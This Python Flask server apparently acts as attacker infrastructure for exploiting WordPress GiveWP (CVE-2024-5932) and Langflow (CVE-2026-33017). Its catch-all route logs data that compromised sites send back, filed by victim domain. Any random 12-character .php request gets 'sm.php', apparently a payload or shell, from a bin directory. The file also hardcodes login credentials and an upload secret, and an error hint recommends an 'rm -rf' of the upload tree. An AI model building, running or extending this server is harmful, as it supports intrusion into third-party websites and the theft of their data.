import os
import re
import json
import hashlib
import shutil
import tempfile
import datetime
from pathlib import Path
from urllib.parse import unquote

from flask import (
    Flask, request, jsonify, make_response, 
    render_template_string, send_from_directory
)
from flask_httpauth import HTTPBasicAuth

# ══════════════════════════════════════════════════════════
# 1. CONFIGURATION & CONSTANTS
# ══════════════════════════════════════════════════════════

# Directories
ROOT_DIR = Path(os.getenv("ROOT_DIR", "./data")).resolve()
UPLOAD_ROOT = Path(os.getenv("UPLOAD_ROOT", "./uploads")).resolve()
DOWNLOADS_DIR = Path(os.getenv("DOWNLOADS_DIR", "./downloads")).resolve()  # NEW: Downloads directory
BIN_DIR = Path(os.getenv("BIN_DIR", "./bin")).resolve()
LOG_FILE_DOMAIN = ROOT_DIR / "domain_logs.jsonl"

# Upload Settings
MAX_UPLOAD_MB = int(os.getenv("MAX_UPLOAD_MB", "500"))
# NEW: Strict secret key for uploads (Change this or set via env var)
UPLOAD_SECRET = os.getenv("UPLOAD_SECRET", "TermuxDropServer_SecretKey_2024!") 

# Ensure base directories exist
for d in [ROOT_DIR, UPLOAD_ROOT, DOWNLOADS_DIR, BIN_DIR]:
    d.mkdir(parents=True, exist_ok=True)

# CVE Stack for catch-all routing
CVE_STACKS = {
    "CVE-2024-5932": ["wp-content", "plugins", "give"],
    "CVE-2026-33017": ["api", "langflow"]
}

# HTML Template for Header Info
HTML_TEMPLATE = """
<!DOCTYPE html>
<html>
<head><title>Client Fingerprinting</title></head>
<body>
    <h2>Server-Side Received HTTP Headers</h2>
    <ul>
        <li>User-Agent: {{ user_agent }}</li>
        <li>sec-ch-ua-model: {{ model }}</li>
        <li>sec-ch-ua-arch: {{ arch }}</li>
        <li>sec-ch-ua-bitness: {{ bitness }}</li>
        <li>sec-ch-ua-platform-version: {{ platform_ver }}</li>
    </ul>
</body>
</html>
"""

# ══════════════════════════════════════════════════════════
# 2. APP INITIALIZATION & AUTHENTICATION
# ══════════════════════════════════════════════════════════

app = Flask(__name__)
auth = HTTPBasicAuth()

# Basic Auth Users (For UI routes if needed)
USERS = {
    "gultard": "Poile12!+"
}

@auth.verify_password
def verify_password(username, password):
    if username in USERS and USERS[username] == password:
        return username
    return None

def requires_auth(f):
    """Decorator to enforce Basic Auth on specific routes."""
    from functools import wraps
    @wraps(f)
    def decorated(*args, **kwargs):
        return auth.login_required(f)(*args, **kwargs)
    return decorated

# ══════════════════════════════════════════════════════════
# 3. HELPER FUNCTIONS
# ══════════════════════════════════════════════════════════

def resolve_upload_path(filepath: str) -> Path:
    """Resolve and jail the path inside UPLOAD_ROOT to prevent traversal."""
    target = (UPLOAD_ROOT / filepath.lstrip("/")).resolve()
    if not str(target).startswith(str(UPLOAD_ROOT)):
        raise ValueError("Path traversal detected")
    return target

def resolve_download_path(filepath: str) -> Path:
    """Resolve and jail the path inside DOWNLOADS_DIR to prevent traversal."""
    target = (DOWNLOADS_DIR / filepath.lstrip("/")).resolve()
    if not str(target).startswith(str(DOWNLOADS_DIR)):
        raise ValueError("Path traversal detected")
    return target

def check_upload_auth():
    """Strictly check X-Upload-Secret header for upload validation."""
    token = request.headers.get("X-Upload-Secret", "")
    if token != UPLOAD_SECRET:
        raise PermissionError("Invalid or missing X-Upload-Secret header")

def sanitize_filename(name: str) -> str:
    """Remove or replace characters illegal in Windows/Unix filenames."""
    return re.sub(r'[\\/*?:"<>|]', '_', name)

def ensure_upload_dir_writable(target: Path) -> Path:
    """Ensure target's parent dir chain (under UPLOAD_ROOT) exists and is
    writable by the current process. Best-effort chmod self-heals stale dirs
    left by an earlier root/proot run or a restrictive umask. If a dir is not
    owned by us, the chmod is skipped and open() will raise PermissionError."""
    rel = target.parent.relative_to(UPLOAD_ROOT)
    d = UPLOAD_ROOT
    for part in rel.parts:
        d = d / part
        d.mkdir(parents=True, exist_ok=True)
        if not os.access(d, os.W_OK | os.X_OK):
            try:
                os.chmod(d, 0o755)
            except PermissionError:
                pass
    return d

def sha256_file(path: Path) -> str:
    """SHA-256 of a file, streamed in chunks."""
    h = hashlib.sha256()
    with open(path, "rb") as fh:
        while True:
            chunk = fh.read(65536)
            if not chunk:
                break
            h.update(chunk)
    return h.hexdigest()

def save_upload(target: Path, stream) -> int:
    """Robust save: stream to a temp file in the target dir, compare against an
    existing target (same size+hash -> skip untouched), otherwise atomically
    replace it. Rename/replace only needs write access to the DIRECTORY, so a
    stale read-only / foreign-owned file no longer blocks the upload.
    Returns the number of bytes stored. Raises OSError on failure."""
    size = 0
    digest = hashlib.sha256()
    tmp_path = None
    with tempfile.NamedTemporaryFile(
        dir=str(target.parent), prefix="." + target.name + ".",
        suffix=".part", delete=False,
    ) as tmp:
        tmp_path = Path(tmp.name)
        while True:
            chunk = stream.read(65536)
            if not chunk:
                break
            tmp.write(chunk)
            digest.update(chunk)
            size += len(chunk)

    try:
        if (
            target.exists()
            and target.is_file()
            and target.stat().st_size == size
            and sha256_file(target) == digest.hexdigest()
        ):
            return size  # identical upload already present - nothing to replace

        os.replace(tmp_path, target)
    finally:
        if tmp_path is not None and tmp_path.exists():
            try:
                tmp_path.unlink()
            except OSError:
                pass
    return size

# ══════════════════════════════════════════════════════════
# 4. ROUTES: UI & CLIENT HINTS
# ══════════════════════════════════════════════════════════

@app.route('/')
@requires_auth
def index():
    return "<h1>Termux Server V3</h1><p>System Online.</p>"

@app.route('/ping', methods=['GET'])
def ping():
    return jsonify({"status": "ok", "ping": "pong"}), 200

@app.route('/header-info', methods=['GET'])
def header_info():
    context = {
        'user_agent': request.headers.get('User-Agent', ''),
        'model': request.headers.get('Sec-CH-UA-Model', 'Not Sent'),
        'arch': request.headers.get('Sec-CH-UA-Arch', 'Not Sent'),
        'bitness': request.headers.get('Sec-CH-UA-Bitness', 'Not Sent'),
        'platform_ver': request.headers.get('Sec-CH-UA-Platform-Version', 'Not Sent'),
    }

    response = make_response(render_template_string(HTML_TEMPLATE, **context))
    
    accept_ch = (
        'Sec-CH-UA-Model, Sec-CH-UA-Arch, Sec-CH-UA-Bitness, '
        'Sec-CH-UA-Platform-Version, Sec-CH-UA-Full-Version-List'
    )
    response.headers['Accept-CH'] = accept_ch
    response.headers['Critical-CH'] = accept_ch
    response.headers['Permissions-Policy'] = 'ch-ua-model=(self), ch-ua-platform=(self)'
    
    return response

# ══════════════════════════════════════════════════════════
# 5. ROUTES: FREE DOWNLOADS (NO AUTH REQUIRED)
# ══════════════════════════════════════════════════════════

@app.route('/pregnant/<path:filepath>', methods=['GET'])
def download_file(filepath):
    """Freely serve files from the downloads directory."""
    try:
        target = resolve_download_path(filepath)
        
        if not target.exists() or not target.is_file():
            return jsonify({"error": "File not found"}), 404
        
        # Calculate relative path for send_from_directory
        rel_path = target.relative_to(DOWNLOADS_DIR)
        
        # as_attachment=True forces the browser to download it rather than display it
        return send_from_directory(DOWNLOADS_DIR, str(rel_path), as_attachment=True)
    
    except ValueError as ve:
        return jsonify({"error": str(ve)}), 400
    except Exception as e:
        app.logger.error(f"Download failed: {e}")
        return jsonify({"error": "Internal server error"}), 500

# ══════════════════════════════════════════════════════════
# 6. ROUTES: FILE UPLOAD (STRICT AUTH REQUIRED)
# ══════════════════════════════════════════════════════════

@app.route('/files/<path:filepath>', methods=['POST'])
def upload_file(filepath):
    target = None
    try:
        # 1. Strict Auth Check
        check_upload_auth()

        # 2. Path Resolution & Validation
        if filepath.endswith('/'):
            return jsonify({"error": "Path must include a filename"}), 400

        target = resolve_upload_path(filepath)

        # 3. Size Limit Check
        content_length = request.headers.get('Content-Length')
        if content_length and int(content_length) > MAX_UPLOAD_MB * 1024 * 1024:
            return jsonify({"error": f"Exceeds {MAX_UPLOAD_MB} MB limit"}), 413

        # 4. Stream and Save File (compare -> atomic replace)
        ensure_upload_dir_writable(target)
        size = save_upload(target, request.stream)

        size = target.stat().st_size
        return jsonify({
            "saved": str(target.relative_to(UPLOAD_ROOT)),
            "bytes": size
        }), 201

    except ValueError as ve:
        return jsonify({"error": str(ve)}), 400
    except PermissionError as pe:
        if target:
            hint = ("Permission denied while saving the upload. On the receiver host "
                    f"fix ownership/permissions of the upload tree and clear stale entries, e.g.: "
                    f"chmod -R u+rwX {UPLOAD_ROOT} && rm -rf {UPLOAD_ROOT}/html "
                    f"(check offending path: {target.parent})")
        else:
            hint = "Invalid or missing X-Upload-Secret header."
        return jsonify({"error": str(pe), "hint": hint}), 401
    except Exception as e:
        app.logger.error(f"Upload failed: {e}")
        return jsonify({"error": "Internal server error"}), 500

# ══════════════════════════════════════════════════════════
# 7. ROUTES: CATCH-ALL & LOGGING
# ══════════════════════════════════════════════════════════

@app.route('/<path:subpath>', methods=['GET', 'POST'])
def catch_all(subpath):
    normalized_path = unquote(subpath).lower()
    detected_cve = None
    target_site = None

    for param, value in request.args.items():
        if param.upper().startswith("CVE-"):
            detected_cve = param.upper()
            target_site = value
            break

    if detected_cve and detected_cve in CVE_STACKS:
        keywords = CVE_STACKS[detected_cve]
        if normalized_path.startswith(keywords) or any(k in normalized_path for k in keywords):
            log_dir = ROOT_DIR / (detected_cve if detected_cve != "CVE-2026-33017" else "Langflow") / "Custom" / "LOGS"
            log_dir.mkdir(parents=True, exist_ok=True)

            if request.method == "POST":
                safe_domain = "unknown_target"
                if target_site:
                    clean = re.sub(r'^https?://', '', target_site)
                    clean = clean.split('/')[0].split(':')[0].split('?')[0]
                    safe_domain = sanitize_filename(clean)
                
                log_file = log_dir / f"{safe_domain}.json"
                with open(log_file, 'a', encoding='utf-8') as f:
                    f.write(request.get_data(as_text=True) + "\n")

            return jsonify({"status": "logged", "cve": detected_cve}), 200

    return send_filebin(subpath)

def send_filebin(path):
    log_entry = {
        "timestamp": datetime.datetime.now(datetime.timezone.utc).isoformat(),
        "ip": request.remote_addr,
        "referrer": request.referrer,
        "user_agent": request.headers.get("User-Agent"),
        "requested_file": path,
        "full_path_query": request.full_path.rstrip('?')
    }

    try:
        with open(LOG_FILE_DOMAIN, "a", encoding="utf-8") as f:
            f.write(json.dumps(log_entry) + "\n")
    except Exception as e:
        app.logger.error(f"Failed to write to log: {e}")

    if re.match(r"^[a-zA-Z0-9]{12}\.php$", path):
        return send_from_directory(BIN_DIR, "sm.php")
         
    return send_from_directory(BIN_DIR, path)

# ══════════════════════════════════════════════════════════
# 8. MAIN EXECUTION
# ══════════════════════════════════════════════════════════

if __name__ == '__main__':
    app.run(port=9999, host='127.0.0.1', debug=True)